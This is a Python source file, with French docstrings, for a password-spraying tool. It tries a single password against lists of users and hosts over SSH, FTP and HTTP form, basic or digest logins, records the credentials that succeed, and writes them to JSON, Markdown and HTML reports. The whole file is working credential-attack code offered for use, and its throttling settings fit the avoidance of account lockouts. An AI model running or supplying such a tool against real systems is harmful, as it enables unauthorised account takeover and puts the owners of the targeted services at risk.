import paramiko
import ftplib
import requests
import time
import datetime
import json
from requests.auth import HTTPDigestAuth
import os

def password_spraying(targets, userlist, password, protocol='ssh', timeout=5, delay=0.5, max_attempts=20, http_method='POST', http_url=None, user_field='username', pass_field='password', success_flag=None, fail_flag=None, auth_type=None):
    """
    Password spraying multi-protocole : SSH, FTP, HTTP (form/basic/digest).
    targets : liste d'IP/host.
    userlist : liste d'utilisateurs.
    password : mot de passe unique à tester sur tous les users.
    Retourne les credentials valides et erreurs.
    """
    results = []
    valid = []
    errors = []
    attempts = 0
    meta = {
        'protocol': protocol,
        'targets': targets,
        'userlist': userlist,
        'password': password,
        'date': datetime.datetime.now().isoformat(),
        'max_attempts': max_attempts,
        'timeout': timeout,
        'delay': delay
    }
    if not targets or not userlist or not password:
        return {'meta': meta, 'valid': valid, 'errors': ['Missing targets/userlist/password'], 'results': results}
    for host in targets:
        for user in userlist:
            if attempts >= max_attempts:
                errors.append('Max attempts reached')
                break
            try:
                if protocol == 'ssh':
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=22, username=user, password=password, timeout=timeout, banner_timeout=timeout, auth_timeout=timeout, allow_agent=False, look_for_keys=False)
                    valid.append({'host': host, 'user': user, 'password': password})
                    results.append({'host': host, 'user': user, 'password': password, 'status': 'success'})
                    ssh.close()
                elif protocol == 'ftp':
                    ftp = ftplib.FTP()
                    ftp.connect(host, 21, timeout=timeout)
                    ftp.login(user, password)
                    valid.append({'host': host, 'user': user, 'password': password})
                    results.append({'host': host, 'user': user, 'password': password, 'status': 'success'})
                    ftp.quit()
                elif protocol == 'http':
                    session = requests.Session()
                    if auth_type == 'basic':
                        resp = session.request(http_method, http_url, auth=(user, password), timeout=timeout)
                    elif auth_type == 'digest':
                        resp = session.request(http_method, http_url, auth=HTTPDigestAuth(user, password), timeout=timeout)
                    else:
                        data = {user_field: user, pass_field: password}
                        resp = session.request(http_method, http_url, data=data, timeout=timeout)
                    status = resp.status_code
                    body = resp.text
                    ok = False
                    if success_flag and success_flag in body:
                        ok = True
                    elif fail_flag and fail_flag in body:
                        ok = False
                    elif success_flag is None and fail_flag is None:
                        ok = status == 200 and user.lower() not in body.lower()
                    if ok:
                        valid.append({'host': host, 'user': user, 'password': password, 'status': status})
                        results.append({'host': host, 'user': user, 'password': password, 'status': 'success', 'code': status})
                    else:
                        results.append({'host': host, 'user': user, 'password': password, 'status': 'fail', 'code': status})
                else:
                    errors.append(f'Protocole non supporté : {protocol}')
            except Exception as e:
                err = str(e)
                results.append({'host': host, 'user': user, 'password': password, 'status': 'error', 'error': err})
                errors.append(err)
            attempts += 1
            time.sleep(delay)
    return {'meta': meta, 'valid': valid, 'errors': errors, 'results': results}


def export_password_spraying_results(data, export_base):
    """
    Exporte les résultats du password spraying en JSON, Markdown, HTML.
    """
    meta = data.get('meta', {})
    valid = data.get('valid', [])
    errors = data.get('errors', [])
    results = data.get('results', [])
    import os, datetime
    date_dir = datetime.datetime.now().strftime("%Y%m%d")
    base_dir = os.path.join(os.getcwd(), "exports", date_dir, "password_spraying")
    os.makedirs(base_dir, exist_ok=True)
    export_base = os.path.join(base_dir, os.path.basename(export_base))
    # JSON
    with open(export_base + '.json', 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    # Markdown
    with open(export_base + '.md', 'w', encoding='utf-8') as f:
        f.write(f"# Rapport Password Spraying\n\n")
        for k, v in meta.items():
            f.write(f"**{k}** : {v}\n")
        f.write(f"\n**Valides** : {len(valid)}\n\n")
        for v in valid:
            f.write(f"- {v['host']} / {v['user']} : {v['password']}\n")
        f.write(f"\n**Erreurs** : {len(errors)}\n\n")
        for e in errors:
            f.write(f"- {e}\n")
        f.write(f"\n**Détail des tentatives** : {len(results)}\n\n")
        for i, r in enumerate(results, 1):
            f.write(f"## Tentative {i}\n")
            for k, v in r.items():
                f.write(f"- **{k}** : {v}\n")
            f.write("\n")
    # HTML
    with open(export_base + '.html', 'w', encoding='utf-8') as f:
        f.write(f"<html><head><meta charset='utf-8'><title>Rapport Password Spraying</title></head><body>")
        f.write(f"<h1>Rapport Password Spraying</h1>")
        for k, v in meta.items():
            f.write(f"<b>{k}</b> : {v}<br>")
        f.write(f"<br><b>Valides :</b> {len(valid)}<ul>")
        for v in valid:
            f.write(f"<li>{v['host']} / {v['user']} : {v['password']}</li>")
        f.write("</ul><br><b>Erreurs :</b> %d<ul>" % len(errors))
        for e in errors:
            f.write(f"<li>{e}</li>")
        f.write("</ul><br><b>Détail des tentatives :</b> %d<br>" % len(results))
        for i, r in enumerate(results, 1):
            f.write(f"<h2>Tentative {i}</h2><ul>")
            for k, v in r.items():
                f.write(f"<li><b>{k}</b> : {v}</li>")
            f.write("</ul><br>")
        f.write("</body></html>")
